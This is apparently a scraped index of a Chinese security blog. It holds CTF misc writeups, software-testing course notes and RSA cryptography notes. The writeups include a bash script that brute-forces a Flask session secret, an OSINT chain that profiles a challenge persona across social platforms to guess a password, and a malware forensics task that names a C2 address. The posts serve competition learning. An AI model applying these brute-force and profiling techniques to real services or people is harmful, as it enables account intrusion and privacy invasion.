Data:eyJhbGdvcml0aG0iOiJkZXMiLCJmbGFnIjoiVW5BbVBWWTRhdCt2bkJqellPNytUZEZSMmZEYnhScytqQzdsMWt2b2hUMFp4clBDOEJUTWJBPT0ifQ.ZkyTwA.KPlAnhfBH8qMClLyoP6yboafHyw 发现需要爆破 flask-session 的密钥 因此我们基于 flask-session-cookie-manager 写个 bash 爆破脚本，就是爆破的速度有点感人。。 #!/bin/bash while read line; do output=$(python3 /home/kali/flask-session-cookie-manager/flask_session_cookie_manager3.py decode -s $line -c 'eyJhbGdvcml0aG0iOiJkZXMiLCJmbGFnIjoiVW5BbVBWWTRhdCt2bkJqellPNytUZEZSMmZEYnhScytqQzdsMWt2b2hUMFp4clBDOEJUTWJBPT0ifQ.ZkyTwA.KPlAnhfBH8qMClLyoP6yboafHyw') if [[ $output != *\"error\"* ]]; then echo $line echo $output fi done \u003c/home/kali/wordlists/dic.txt 最后爆破出密钥：12312312，然后再用这个密钥去解密DES即可 WKCTF{N0w_u_Know_th3_fl4sk_Sess1on} ⼩z的社交⽹络 题面信息提示了这是一张由 AES-ECB 算法加密的 ppm 图片： 赛后知道了有这个项目：https://doegox.github.io/ElectronicColoringBook/ 原理大概就是：相同的明文块被加密成相同的密文块 直接使用这个项目还原一下这张图片，得到id：M3moryyy python .\\ElectronicColoringBook.py .\\id.ppm 然后去各大社交平台搜索这个id，在微博中可以搜到这个用户 在他的关注列表里可以搜到另一个头像中有 CTF 字样的人 然后发现他的博客地址，base64解码一下得到：www.zimablue.life 翻阅博客，发现一篇加密的文章 在微博中发现密码的线索：密码是女朋友的生日 通过上一篇博文中小红书的id去搜索 base58解码后可以得到一串数字，猜测是QQ号 去QQ搜索这个QQ号就可以看到出生日期了，所以密码就是20000917 解开那篇文章后发现需要去Github上找 在Github上找到下面这个仓库 把这个项目 clone 到本地，查看历史版本，发现删除了flag 使用以下命令回退到之前的版本，得到FLAG.zip git reset --hard ed8d79ebf1af3eaea037ca6c500b9aba64726894 解压压缩包后得到 .FLAG.swp ，在里面找到flag WKCTF{1111_2222_3333_4444_hhhh} ","date":"2024-07-17","objectID":"/posts/2125dc5/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 WKCTF Misc Writeup","uri":"/posts/2125dc5/"},{"categories":["Writeup"],"content":"这比赛有点难评只能说，但是确实是《人民的好比赛》 题目名称 RSA_KU 解一个方程就可以得到p和q，然后解RSA即可 import gmpy2 from sympy import * from Crypto.Util.number import * n = 129699330328568350681562198986490514508637584957167129897472522138320202321246467459276731970410463464391857177528123417751603910462751346700627325019668100946205876629688057506460903842119543114630198205843883677412125928979399310306206497958051030594098963939139480261500434508726394139839879752553022623977 e = 65537 c = 81542950634170106435892662475507283547967877210216191810634513013031046158459269258017597038287472919950811537049030186565471870789076226171751774409328287149914234904307925163438628271194937049804334335349685851934799426152133152587428808924287968838087416148799251156379854263050430010921100416842555347176 r1 = 129699330328568350681562198986490514508637584957167129897472522138320202321246467459276731970410463464391857177528123417751603910462751346700627325019668067056973833292274532016607871906443481233958300928276492550916101187841666991944275728863657788124666879987399045804435273107746626297122522298113586003834 r2 = 129699330328568350681562198986490514508637584957167129897472522138320202321246467459276731970410463464391857177528123417751603910462751346700627325019668066482326285878341068180156082719320570801770055174426452966817548862938770659420487687194933539128855877517847711670959794869291907075654200433400668220458 p = Symbol('p') q = Symbol('q') res = solve([(p-2)*(q-1)-r1, (p-1)*(q-2)-r2], [p, q])[1] p = int(res[0]) q = n//p phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) # print(m) print(long_to_bytes(m)) # b'ISCC{EmTOvTJP4NZQLr8Yy2--}' 题目名称 时间刺客 题目附件给了一个压缩包，解压后得到给你也用不了.pcap和29.7z 打开流量包，发现是USB流量，直接用脚本进行提取后可以得到如下内容 但是经过尝试发现是个假的flag，其实流量包的文件名也提示了 之后仔细查看题目名称：时间刺客 以及题面的提示：2024年10月14日早8点，小明敲键盘时候解出了flag 猜测与这个时间有关，然后在29.rar中发现了接近的时间 经过尝试，发现直接把文件0.txt-1.txt的时间减去题面中的时间得到的秒数 转为ascii码然后套上ISCC{} 就是flag：ISCC{ZpwRByy6TXk0oR4FDB} data = \"90 112 119 82 66 121 121 54 84 88 107 48 111 82 52 70 68 66\" ls = data.split() print(ls) for item in ls: print(chr(int(item)), end=\"\") 题目名称 工业互联网模拟仿真数据分析 题目一：在某些网络会话中，数据包可能保持固定大小，请给出含有此确定性特征的会话IP地址和数据包字节大小值。 使用wireshark的过滤器一个个筛选，发现(ip.src == 192.168.1.2) \u0026\u0026 (ip.dst == 192.168.1.4)的数据包的长度都是24，因此这题的答案就是 192.168.1.2,192.168.1.4,24 题目二：通信包数据某些字段可能为确定的，请给出确定字节数值。 翻看流量包，关注流量的data字段，发现data字段的前四位都是2024 因此本题的答案就是 2024 题目三：一些网络通信业务在时间序列上有确定性规律，请提供涉及的IP地址及时间规律数值（小数点后两位） 使用wireshark的过滤器进行筛选，发现只有(ip.src == 192.168.1.3) \u0026\u0026 (ip.dst == 192.168.1.5)的每帧的间隔都大致为0.06 因此本题的答案为：192.168.1.3,192.168.1.5,0.06 题目四：一些网络通信业务存在逻辑关联性，请提供涉及的IP地址 因为题目中提示了逻辑关联性，因此猜测是两个以上ip之间连续的通信 翻看流量包，发现只有192.168.1.2,192.168.3,192.168.1.6有这样的特征 仔细查看下图中的分组，发现这三个ip的通信有明显的规律 因此大胆猜测本题答案就是 192.168.1.2,192.168.3,192.168.1.6 题目五：网络数据包往往会添加数据完整性校验值，请分析出数据校验算法名称及校验值在数据包的起始位和结束位（倒数位） 校验算法网上一搜很容易就可以知道只可能是：CRC16或CRC32 然后题目提示结束位是倒数位，如上图，很容易可以知道是 1 如果是上图那样的顺序，起始位应该是7，但是提交后发现不对 因此遍历1-7以及对CRC16和CRC32进行尝试，发现遍历到4且校验算法是CRC16的时候答案正确 因此本题的答案为：CRC16,4,1 最后使用题目附件给的 flag.py 生成flag即可 adcca5c2a82064a17a645d35b6b054cd import hashlib def generate_flag(*answers): # 将所有答案使用英文逗号连接 combined_answers = ','.join(answers) # 生成flag格式 initial_flag = f\"ISCC{{{combined_answers}}}\" # 对flag进行MD5加密 md5_hash = hashlib.md5(initial_flag.encode()).hexdigest() return md5_hash # 示例用法 if __name__ == \"__main__\": answers = [ \"192.168.1.2,192.168.1.4,24\", # 第一小题答案：IP顺序从小到大排列，涉及的IP个数由选手自己判断，数值为整数 \"2024\", # 第二小题答案：数值为整数 \"192.168.1.3,192.168.1.5,0.06\", # 第三小题答案：IP顺序从小到大排列，涉及的IP个数由选手自己判断，数值保留小数点后2位 \"192.168.1.2,192.168.1.3,192.168.1.6\", # 第四小题答案：IP顺序从小到大排列，涉及的IP个数由选手自己判断 \"CRC16,4,1\" # 第五小题答案：数据校验算法名称长度为5个字符，其中英文字母大写 ] # 生成MD5加密后的flag final_flag = generate_flag(*answers) # 输出最终的MD5加密字符串 print(final_flag) # adcca5c2a82064a17a645d35b6b054cd 题目名称 Number_is_the_key 题目附件给了一个后缀为 .xlsx 的 Excel 文件 打开发现是空白的，因此我们将其后缀改为 .zip 然后解压 然后查看 sheet1.xml 文件 发现从 AB28 开始后的单元格就设置了特殊的格式 因此，我们使用 Excel 的 方方格子 插件，将所有带有特殊格式的单元格都染上黑色 最后就可以得到一张二维码，扫码然后套上 ISCC{} 即可得到flag：ISCC{NEfmGuWH9kj3} 题目名称 钢铁侠在解密 下载附件得到一张bmp和一个txt文件，txt中的内容如下 bmp图片用silenteye的默认密钥解密可以得到一个row_15.txt文件，内容如","date":"2024-06-30","objectID":"/posts/a7d0d5f/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 全国大学生信息安全与对抗技术竞赛(ISCC) Misc Writeup","uri":"/posts/a7d0d5f/"},{"categories":["Course"],"content":"学校里的《软件质量保证与测试》课程 2.5单元测试 单元的定义 一个函数 类或类的成员函数 几个函数的集合 单元测试的定义 单元测试是对软件基本组成单元进行测试，主要是为了发现单元内部可能存在的各种错误和不足 主要工作分为两个步骤：人工静态检查和动态执行跟踪 一般由开发组在开发组长监督下进行 单元测试的主要任务 在单元测试时，测试者需要依据详细设计说明书和源程序清单，了解该模块的I/O条件和模块的逻辑结构，主要采用白盒测试方法，辅之以黑盒测试方法设计测试用例，使之对任何合理的和不合理的输入，都能鉴别和响应。 模块接口测试 局部数据结构测试 路径测试 错误处理测试 边界测试 单元测试环境 1、详细设计说明书 2、源程序清单 3、驱动模块 4、桩模块 设计测试用例的思路 为系统运行设计测试用例 为正向测试设计用例 为逆向测试设计用例 为满足特殊需求设计测试用例 为代码覆盖设计用例 优势 单元测试体现了尽早测试原则 单元测试有助于提高代码质量 单元测试也可以理解为一种编写文档的行为 驱动模块和桩模块 驱动模块是用来模拟被测试模块的上一级模块，相当于被测模块的主程序。它接收数据，将相关数据传送给被测模块，启用被测模块，并打印出相应的结果。 简单说就是你负责测试的模块没有main()方法入口，所以需要写一个带main的方法来调用你的模块或方法。这个就是驱动测试 桩程序（Stub），也称桩模块，是指模拟被测试的模块所调用的模块，而不是软件产品的组成的部分，用以模拟被测模块工作过程中所调用的下层模块。 桩是指用来代替关联代码或者未实现的代码。如果函数B用B1来代替，那么，B称为原函数，B1称为桩函数。打桩就是编写或生成桩代码。 2.6集成测试 四种集成测试方法的名称 1.大爆炸集成 2.自顶向下集成 3.自底向上集成 4.三明治集成 给程序架构图、指定集成策略、按顺序画出集成策略的步骤图 大爆炸集成 自顶向下集成 自底向上集成 三明治集成 3.1黑盒测试方法概述 3.2黑盒测试——边界值分析法 一般性测试时输入变量取： 最小值(min) 略高于最小值(min+) 正常值(nom) 略低于最大值(max-) 最大值(max) 结论：对于一个n变量函数，测试用例数为4n+1个 健壮性测试时输入变量取： 最小值(min) 略高于最小值(min+) 正常值(nom) 略低于最大值(max-) 最大值(max) 略超过最大值(max+) 略低于最小值(min-) 结论：对于一个n变量函数，测试用例数为6n+1个 最坏情况测试 最坏情况测试用例： 所有变量均可取最小值(min)、略高于最小值(min+)、正常值(nom)、略低于最大值(max-)、最大值(max) 这五个值中的任何一个 结论：测试用例为五个集合的笛卡儿乘积，n变量的最坏情况测试会产生5n个测试用例 健壮最坏情况测试用例： 所有变量均可取略低于最小值(min-)，最小值(min)、略高于最小值(min+)、正常值(nom)、略低于最大值(max-)、最大值(max) ，略超过最大值(max+)这七个值中的任何一个。 结论：n变量的健壮最坏情况测试会产生7n个测试用例 边界值测试不同情况下的用例数 边界值测试用例数：4n+1 边界值健壮测试用例数：6n+1 最坏情况下边界值一般性测试用例数：5n 最坏情况下边界值健壮性测试用例数：7n 3.3黑盒测试——等价类测试 等价划分法是一种不需要考虑程序的内部结构，只需要考虑程序输入数据的黑盒测试方法，它将不能穷举的测试过程进行合理分类，从而保证设计出来的测试用例具有完整性和代表性。 ​ 需要把用户所有可能输入的数据划分成若干份（若干个子集），然后从每一个子集中选取少数并且具有代表性的数据作为测试用例的数据，这种方法被称为等价类划分法。 ​ 在有限的测试资源的情况下，用少量且有代表性的数据进行测试会得到比较好的测试效果。 1.等价类划分 等价类划分的基本思想是把可能用到的数据划分为不同的类别，然后再从每一类别里面挑选有代表性的数据。这样挑选出来的数据就可以代表这一类里面的全部数据。通过这种方式，可以减少测试用例的数量。 2.等价类分类 等价类可以等同于有效等价类和无效等价类的组合 （1）有效等价类：指符合范围文档描述，输入合理的数据集合。 （2）无效等价类：指不符合需求文档描述，输入不合理的数据集合。 等价类测试的用例数 等价类测试用例设计步骤： 为每一个等价类规定一个唯一的编号； 设计一个新的测试用例,使其尽可能多地覆盖尚未被覆盖的有效等价类, 重复这一步，直到所有的有效等价类都被覆盖为止； 设计一个新的测试用例,使其仅覆盖一个尚未被覆盖的无效等价类, 重复这一步，直到所有的无效等价类都被覆盖为止。 等价类测试法的原则和指导方针 弱等价类测试（一般或弱健壮）不如对应的强形式的测试全面。 强类型程序设计语言不需要健壮性测试。 如果错误条件非常重要，适合采用健壮性测试。 如果输入数据以离散值区间和集合定义，则等价类测试是合适的。 同边界值测试方法相结合，可以大大增加等价类测试方法的测试能力。 如果程序的函数很复杂，则适合采用等价类测试。 强等价类测试会导致测试用例冗余性问题。 在发现“合适”的等价关系之前，可能需要进行多次尝试。 3.4黑盒测试——决策表测试 组成 桩 条目 条件桩 条件条目 行动桩 行动条目 条件桩：列出了问题的所有条件，通常认为列出的条件的次序无关紧要。 动作桩：列出了问题规定可能采取的操作，这些操作的排列顺序没有约束。 条件项：列出针对它左列条件的取值，在所有可能情况下的真假值。 动作项：列出在条件项的各种取值情况下应该采取的动作。 规则：任何一个条件组合的特定取值及其相应要执行的操作称为规则。 有限条目决策表：所有条件都是二值条件（真/假） 扩展条目决策表：条件可能有多个值 决策表建立的步骤 1.列出所有的条件桩和行动桩 2.确定规则的个数 3.填入条件项 4.填入动作项 5.合并相似规则 决策表测试法原则与指导方针 每种测试方法都有使用的范围，基于决策表测试方法通常适用于要产生大量决策的情况。一般来说，决策表测试方法用于具有如下特征的应用程序： if-then-else逻辑关系突出； 输入变量之间存在逻辑关系； 计算过程涉及对输入变量子集的处理； 输入与输出之间存在着因果关系； 圈复杂度较高的应用 在建立决策表的过程中不容易一步到位，采用迭代的方法逐步优化； 决策表规模的增长方式不佳，有n个条件的有限项决策表有2n条规则，在实际应用中，可以采取扩展决策表、使用代数方法简化决策表。 3.5黑盒测试——因果图测试 因果图适用场景 等价类划分法和边界值分析法都是着重考虑输入条件，但没有考虑输入条件的组合以及制约关系。如果在测试时必须考虑输入条件的各种组合，那组合的数目可能是天文数字，所以必须考虑采用一种合适的方法对条件组合进行分析，简化。最终目的是用最少的测试用例覆盖最全面的场景。 因果图中的基本符号 原因与结果之间的关系 1.恒等：若原因出现，则结果出现；若原因不出现，则结果也不出现。恒等关系“—”来表示。 2.非：若原因出现，则结果不出现；若原因不出现，则结果出现。非的关系用 “ ~ ” 表示。 3.或：有多个原因，若几个原因中有一个成立，则结果出现；若几个原因都不成立，则结果不出现。或的关系用 “ V ” 来表示。 4.与：有多个原因，只有几个原因都成立，结果才出现；若其中一个原因不成立，则结果不出现。与的关系用 “ ^ ” 来表示。 因果图中的约束条件 原因与原因之间的约束关系 1.互斥 E：a、b、c 只能有一个成立，但是可以都不成立。\u003c=1 2.包含 I：a、b、c 中至少有一个成立。可以多选但不能不选。\u003e=1 3.唯一 O：a、b、c 中有且只有一个成立。=1 4.要求 R：当C1出现时，C2必须出现；C1不出现时，C2不做要求。 结果与结果之间的约束关系 强制屏蔽 M：当E1是1时，E2必须是0；E1为0时，E2的值不确定。 因果图法基本步骤 1.找出所有的原因，原因即输入条件或输入条件的等价类。 2.找出所有的结果，结果即输出条件。 3.明确所有输入条件之间的制约关系以及组合关系，判断条件是否可以组合。 4.明确所有输出条件之间的制约关系以及组合关系，判断结果是否可以同时输出。 5.找出不同输入条件组合会产生哪些输出结果。 6.将因果图转换成判定表或决策树。 7.判定表或决策表中每一列表示的情况设计测试用例 示例 交通一卡通自动充值软件系统。系统只接收 50 或 100 元纸币，一次只能使用一张纸币，一次的充值金额只能为 50 或 100 元。 明确输入的条件为： 1.选择投币 50 元 2.选择投币 100 元 3.选择充值 50 元 4.选择充值 100 元 ​ 明确输出的结果为： a. 完成充值、退卡 b. 提示充值成功 c. 找零 d. 提示错误 分析输入条件 1、不能组合的条件 条件 1 和 2 不能同时成立； 条件 3 和 4 不能同时成立。 2、可以组合的条件 条件 1 和 3 可以同时成立； 条件 1 和 4 可以同时成立； 条件 2 和 3 可以同时成立； 条件 2 和 4 可以同时成立； 条件 1 2 3 4 可以单独出现。 分析输入条件 1、不能组合的输出结果（互斥关系） 输入 a 和 d 不能同时出现； 输出 b 和 d 不能同时出现。 2、可以组合的输出结果（要求） 输出 a 和 b 一定会同时出现（要求）； 输出 a、b、c可以同时出现； 输出 c、d可以同时出现； 输出 d 单独存在。 这里只给出其中一种","date":"2024-06-21","objectID":"/posts/0434e3f/:0:0","tags":["Course"],"title":"Review of Software-Testing","uri":"/posts/0434e3f/"},{"categories":["CTF"],"content":"This a simple record of Crypto in CTF. 古典密码 古典密码这一块直接看 Misc 那篇文章吧 现代密码 前置知识 模运算的基本规则 分配律 (a+b)mod p=(amod p+bmod p)mod p(a∗b)mod p=(amod p∗bmod p)mod pabmod p=((amod p)b)mod p (a+b)\\mod p=(a\\mod p+b\\mod p)\\mod p\\\\(a*b)\\mod p=(a\\mod p*b\\mod p)\\mod p\\\\a^b\\mod p=((a\\mod p)^b)\\mod p (a+b)modp=(amodp+bmodp)modp(a∗b)modp=(amodp∗bmodp)modpabmodp=((amodp)b)modp结合律 ((a+b)mod p+c)mod p=(a+(b+c)mod p)mod p((a∗b)mod p∗c)mod p=(a∗(b∗c)mod p)mod p ((a+b)\\mod p+c)\\mod p=(a+(b+c)\\mod p)\\mod p\\\\((a*b)\\mod p*c)\\mod p=(a*(b*c)\\mod p)\\mod p ((a+b)modp+c)modp=(a+(b+c)modp)modp((a∗b)modp∗c)modp=(a∗(b∗c)modp)modp 若a\\equiv b\\mod p，对于任意的c，都有(a+c)\\equiv (b+c)\\mod p\\\\若a\\equiv b\\mod p，对于任意的c，都有(a*c)\\equiv (b*c)\\mod p\\\\若a\\equiv b\\mod p，对于任意的c，有c\\equiv d\\mod p，\\\\则(a+c)\\equiv (b+d)\\mod p\\\\(a*c)\\equiv(b*d)\\mod p 费马小定理 对于任意素数q和任意整数a，其a不是p的倍数，则\\\\a^{p-1}\\mod p=1 扩展欧几里得算法 RSA 基础知识 素数：一个数如果除了1与它本身之外没有其他的因数，那么这个数就被称为素数。 合数：如果一个数大于1，且该数本身不是素数，那么这个数就是一个合数。 互质数：如果两个整数a,b的最大公因数gcb(a,b)=1，那么称a,b两数互质。 欧拉函数值:设m为正整数，则1,2,3,4…….,m中与m互素的整数的个数记为φ(m)叫做欧拉函数，欧拉函数的值叫做欧拉函数值。如果m为素数，那么φ(m)=n-1；如果m=pq，且p和q互素，那么φ(m)=(p-1)*(q-1) 取模运算与同余的概念:如果存在一个正整数m与两个整数a,b，如果a-b能够被m整除，也就是说m|(a-b),那么a和b模m同余 记做：a=b mod m 模指数运算:模指数运算即先进行指数运算，之后再进行取模运算。记做：a=be mod m 逆元：如果 gcd(a,b)=1 且 a * x ≡ 1(mod b) ，那么 x 为 a 的逆元。可以说 x 为 a 的倒数(a-1) （或模反元素） 模运算重要定理:若a≡b (mod p)，则对于任意的正整数c，都有(a * c) ≡ (b * c) (mod p)； 最简单的RSA加密过程： 1、选择一对不相等且足够大的质数 p、q 2、计算p、q的乘积n 3、计算n的欧拉函数：的∮(n)=(p-1)*(q-1) 4、选一个与∮(n)互质的整数e ：1\u003ce\u003c∮(n) 5、计算出e对于∮(n)的模反元素：ed mod ∮(n)=1 6、公钥：KU(e,n) 7、私钥：KR(d,n) pow(x, y, z)：等同于pow(x, y) mod z 明文 M：加密 M^e mod n = C 或者 C = pow(M, e, n) 密文 C： 解密 C^d mod n = M 或者 M = pow(c, d, n) 例子： s1: p=3 q=11 s2: n=pq=33 s3:∮(n)=(p-1)(q-1)=20 s4: 取e=3 s5: 找到d=7 (3d mod 20)=1 s6: KU=(e,n)=(3,33) s7: KR=(d,n)=(7,33) 若M=20 C = M^e mod n=14 解密原理同上 一些脚本： def EX_GCD(a,b,arr): #扩展欧几里得 if b == 0: arr[0] = 1 arr[1] = 0 return a g = EX_GCD(b, a % b, arr) t = arr[0] arr[0] = arr[1] arr[1] = t - int(a / b) * arr[1] return g ​ def ModReverse(a,n): #ax=1(mod n) 求a模n的乘法逆x arr = [0,1,] gcd = EX_GCD(a,n,arr) if gcd == 1: return (arr[0] % n + n) % n else: return -1 ​ e = 4 d = 7 print(ModReverse(e,d)) 基础RSA加密脚本 from Crypto.Util.number import * import gmpy2 ​ msg = 'flag is :testflag' hex_msg=int(msg.encode(\"hex\"),16) #hex_msg=bytes_to_long(msg) print(hex_msg) p=getPrime(100) q=getPrime(100) n=p*q e=0x10001 phi=(p-1)*(q-1) d=gmpy2.invert(e,phi) #求逆元 print(\"d=\",hex(d)) c=pow(hex_msg,e,n) print(\"e=\",hex(e)) print(\"n=\",hex(n)) print(\"c=\",hex(c)) 基础RSA解密脚本 import binascii import gmpy2 n=0x80b32f2ce68da974f25310a23144977d76732fa78fa29fdcbf p=780900790334269659443297956843 q=1034526559407993507734818408829 e=0x10001 c=0x534280240c65bb1104ce3000bc8181363806e7173418d15762 ​ phi=(p-1)*(q-1) d=gmpy2.invert(e,phi) m=pow(c,d,n) print(hex(m)) print(binascii.unhexlify(hex(m)[2:].strip(\"L\"))) #print(\"c=\", long_to_bytes (m)) dp泄露 给出公钥n,e以及dp 求解私钥d脚本: def getd(n,e,dp): for i in range(1,e): if (dp*e-1)%i == 0: if n%(((dp*e-1)/i)+1)==0: p=((dp*e-1)/i)+1 q=n/(((dp*e-1)/i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi return d 低加密指数广播攻击 如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。 这个识别起来比较简单，一般来说都是给了三组加密的参数和明密文，其中题目很明确地能告诉你这三组的明文都是一样的，并且e都取了一个较小的数字。 ​ import binascii,gmpy2 ​ def CRT(mi, ai): assert(reduce(gmpy2.gcd,mi)==1) assert (isinstance(mi, list) and isinstance(ai, list)) M = reduce(lambda x, y: x * y, mi) ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) for (m, a) in zip(mi, ai)] return reduce(lambda x, y: x + y, ai_ti_Mi) % M 公钥n由多个素数因子组成 给出e，n，c； 已知：n=p*q*r*s，公钥n是由四个素数相乘得来的 ​ 如果四个素数接近，使用yafu直接分解 ​ 解题脚本： import binascii import gmpy2 p=1249559655343546956371276497499 q=1249559655343546956371276497489 r=1249559655343546956371276497537 s=1249559655343546956371276497423 e=0x10001 c=0x22fda6137013bac19754f78e8d9658498017f05a4b0814f2af97dc2c60fdc433d2949ea27b13337961ef3c4cf27452ad3c95 n=p*q*r*s phi=(p-1)*(q-1)*(r-1)*(s-1) d=gmpy2.invert(e,phi) m=pow(c,d,n) print(binascii.unhexlify(hex(m)[2:].strip(\"L\"))) 小明文攻击 低加密指数攻击 给出n，c，e； ​ 明文过小，导致明文的e次方仍然小于n","date":"2024-05-31","objectID":"/posts/a4ba07e/:0:0","tags":["CTF"],"title":"CTF-密码学","uri":"/posts/a4ba07e/"},{"categories":["Writeup"],"content":"又是一年国赛，这次纯纯是被队友带飞了！！！ 题目名称 火锅链观光打卡 浏览器下载一个MetaMask插件，连上题目的容器 然后领取一下空投，回答几道题拿到原料兑换 NFT 即可得到 flag flag{y0u_ar3_hotpot_K1ng} 题目名称 Power Trajectory Diagram 题面信息如下 下载附件并解压，得到一个 attachment.npz 发现有四部分的数据，通过查看 input 和 index 后可以知道 题目是一共爆破了13个字符，每个字符爆破了40次，然后每次爆破都会有一条 trace 写一个 python 脚本读取 trace 数据并画折线图，发现每条 trace 都会有一个最小值 因此我们先记录每条 trace 中的最小值 最后经过尝试，把每40条记录中的最大值连起来就是flag flag{_ciscn_2024_} import numpy as np data = np.load('attachment.npz') # print(data.files) # ['index', 'input', 'output', 'trace'] trace = data['trace'] input = data['input'] # print(len(input)) index = data['index'] # print(trace.shape) # (520, 5000) 520/40=13 # 一共爆破了13个字符，每个字符爆破了40次，每次爆破都会有一条trace for i in range(12): res = [] table = input[:40] for j in range(40): # 记录每条trace中的最小值 min = np.argmin(trace[i*40+j]) res.append(min) # print(res) # 通过提取res列表中的最大值来确定爆破出字符的index index = np.argmax(res) char = table[index] print(char, end=\"\") # _ciscn_2024_ 题目名称 神秘文件 下载附件并解压，得到一个 attachment.pptm 使用 exiftool 查看 pptm 的元信息，发现有一个 Bifid cipher 然后使用 CyberChef 解密即可得到：Part1:flag{e 把 .pptm 文件改后缀为 .zip 解压并打开 在 attachment\\ppt\\embeddings 路劲下发现有个 .docx 文件 改后缀为 .zip 并解压，打开word目录中的 document.xml 得到提示，原来似乎有什么，后来好像被小Caesar抱走了 然后直接使用 CyberChef 解密即可得到：part2:675efb Tips：这里在 CyberChef 中使用 ROT13 是因为解密后它会自动 magic 识别 base64，就比较方便 打开 PPT 发现发现有嵌入了 宏代码 直接使用 olevba 提取宏代码，然后问问GPT，发现是个RC4加密 直接使用 CyberChef 解密 RC4 即可得到：PArt3:3-34 在 PPT 的第三页中发现有 Base64编码后的字符串：UGF5dDQ6NmYtNDA= 使用 CyberChef 解密即可得到：Payt4:6f-40 在 PPT 的最后一页中发现多次 Base64 编码后的字符串 直接使用 BaseCrack 解码即可得到：pArt5:5f-90d 在 ppt 的第五页，缩小可以看到一串base64编码的字符串：UGFyVDY6ZC0y CyberChef解码得到：part6:d-2 在PPT的第四章打开选择窗口，可以得到提示：ROT13(All) HRSFIQp9ZwWvZj== CyberChef 解密即可得到：PART7=22b3 在 pptm 解压出来的 ppt\\slideLayouts\\slideLayout2.xml 中得到如下提示 c1GFSbd3Dg6BODbdl Remove All ’B ’/’b’ /’1 ’/’3’\u003c 根据提示，去除上面四个字符后得到：cGFSdDg6ODdl CyberChef解密即可得到：paRt8:87e 在 pptm 解压出来的 \\ppt\\media\\image57.jpg 中发现一串base64编码： cyberchef解码即可得到：parT9:dee 在 pptm 解压出来的 comments/comment1.xml 中发现维吉尼亚密码 直接使用在线网站解密即可得到：PARt10:9} 最后，把上面的10段 flag 连起来即可得到最后的flag：flag{e675efb3-346f-405f-90dd-222b387edee9} 题目名称 盗版软件 下载附件并解压，得到一个 hackexe.exe 和一个 3842.dmp 内存转储文件 运行这个 exe 后可以会在.ss文件夹下生成一个 loader.exe 和一个 output.png out.png 的上方有一些模糊的小块，感觉是隐写了 用 stegsolve 打开，发现所有红色通道中都有明显的 LSB 痕迹 Data Extract preview 发现有一个压缩包，只不过每字节后都嵌入了垃圾数据 写个Python脚本提取出来即可 with open('data', 'rb') as f: data = f.read() res = [] i = 8 while i \u003c len(data): res.append(data[i]) i += 2 # print(res) with open('flag.zip', 'wb') as f: f.write(bytes(res)) 解压压缩包得到一个.b文件，里面内容如下 r()J$nEA'r!!#;^5u:HM1\"'W(Mc*q[\u003c_/-H(eBQ_+@m$P8kMf4a[h\u003e1:e3=VX?9p=!\\\u003eH[_9!-P!Q!d_;F+/NMc([U69Id\u003ect7iR(^gBUKlR.n!/lA`!!!!iKtqeC8-.(6Mb\"[QMa/CV!RTk-8H6e+1!)_\u003e1l+['ejqO2X?j\\E%7($238erL9ERs6#Xpc$FkBeaMa/OZ!RPFEM[W-EMa/7R!RO,j\"Gf?G6!.Ga!ROtQ6!-EU6!?g3ll\\Sls57!F=^\"@S''W'hs8Q@r^3=WR?SaG;!'sXWM\u003c7?[m%=@Z!(i%/8\\\u003e*)+T!Ns8F\u0026Q@8VuM%M=EmC9Qqfgs4'f\"l=^2!!!$.f\\g`/F!\u003c:Sa$:.up:e`[d9ejFSs1h0^_FX^B8;Y/K]'9g`i;_=uM8s?B6!-g;i^eq%6+WJ\\FCG4\"Ktqd;8cR(Yjlhm.!!#QBlju^Ei_;/LC'6h)8;[..\\cUR+?iSZ/p],bC8;\"i'?A\\Aj5XAOd!\"],16!-[7njkLW6+U0o;s\"\u002608;Y5UM8r=Fa[q?Y8;Z%kM\u003e9HK!nkY%s4)bs!.?7t6!%3\u0026!'gMa6!.k%\u003e!]_-0+Tc:eQ5m\u003e\\ohmb@K4kLs3Bjks8W*i!Q.GW`^kgWFgOI7k?)I!=hET4.LJIugAf\\ 然后 CyberChef base85解码一下 下载解码后的内容，然后丢到微步云沙箱在线运行一下就可以得到题目中的 C2地址：39.100.72.235 dmp文件用vol好像提取不出来什么，但是R-stdio可以 在ctf用户的 download 文件夹下发现有一个 iFlylME Setup 3.0.1735.exe 安装程序 网上搜索后知道是讯飞输入法的安装程序，但是经过分析，题目中的盗版软件应该指的是 procexe.exe 因为 procexe.exe 和附件中的 hackexe.exe 大小是一样的 根据题面的内容，猜测是 firefox 浏览器取证，根据网上的参考文章firefox的历史记录会保存在以下路径中 Users\\ctf\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles_gcqzno5i\\palce.sqlite 但是这道题好像提取不出来，提示损坏了 因此我们直接在Linux系统中使用 strings 3842.dmp| grep https:// | uniq \u003e http.txt 命令 查看得到的 txt 文件，发现出题人用百度搜索了很多东西 比如 process ko破解版、process破解版、winhack.exe、讯飞输入法 等等 但是还是无法得到具体下载盗版软件的地址，但是我们可以确定出题人一定访问了百度 因此我们使用 R-stdio 把整个 ctf 文件夹都导出来，然后使用 everything 的高级搜索 然后在 28CBB9632C21E18AE4E9238F447E10907D5F0062 文件中发现几个可疑地址 除去和百度以及讯飞有关系的网址后，得到下面两个网址 http://winhack.com https://www.waodown.com/ 经过尝试，发现 winhack 那个是正确答案 赛后和别的师傅交流后发现，这里直接把 dmp 文件后缀改成 .data 然后拖入 Gimp 调位移和宽高就能直接得到 winhack.com39.100.72.235 fl","date":"2024-05-19","objectID":"/posts/1b1f96e/:0:0","tags":["CTF","Writeup"],"title":"2024 全国大学生信息安全竞赛初赛 Misc Writeup","uri":"/posts/1b1f96e/"},{"categories":["Writeup"],"content":"宁波市赛的 Misc 还是一如既往的抽象 @_@ 还是太菜了，赛中只做出了一道 Misc 本文中涉及的具体题目附件可以进我的 知识星球 获取 题目名称 babypng 题目附件给了一张 sakiko.png，用 stegsolve 查看，发现在 红色通道7 绿色通道7 蓝色通道7 中存在 LSB 隐写 因此，我们使用 stegsolve 把这三个通道中的数据提取出来 然后直接使用 CyberChef 解密即可 发现在每段前面都有可疑的字符，手动一个个提取出来可以得到：PixelJihad_key:ezgame 最后使用 PixelJihad 解密即可得到 